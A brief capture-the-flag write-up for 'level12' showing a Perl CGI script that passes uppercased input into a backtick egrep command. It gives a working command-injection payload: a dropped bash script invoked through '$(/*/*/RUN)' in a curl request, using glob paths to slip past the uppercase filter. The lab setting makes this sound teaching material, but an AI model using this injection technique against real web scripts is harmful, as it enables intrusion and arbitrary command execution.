## level12

Look at the script and get familiar with [this](https://perldoc.perl.org/perlop#Quote-and-Quote-like-Operators)
level12.pl:
```perl
...
sub t {
    $nn = $_[1];
    $xx = $_[0];
    $xx =~ tr/a-z/A-Z/; 
    $xx =~ s/\s.*//;
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
...
```

The first regex will transform the arg string to uppercase.<br>
The second one will remove the string if it contains a space.

So, the code we're trying to inject should consist of only uppercase letters and shoudn't contain any spaces.

The solution is to run the script that will be found by a name:
```bash
echo -e "#!/bin/bash\ngetflag>/var/crash/key" > /var/crash/RUN

curl http://localhost:4646?x='$(/*/*/RUN)'
```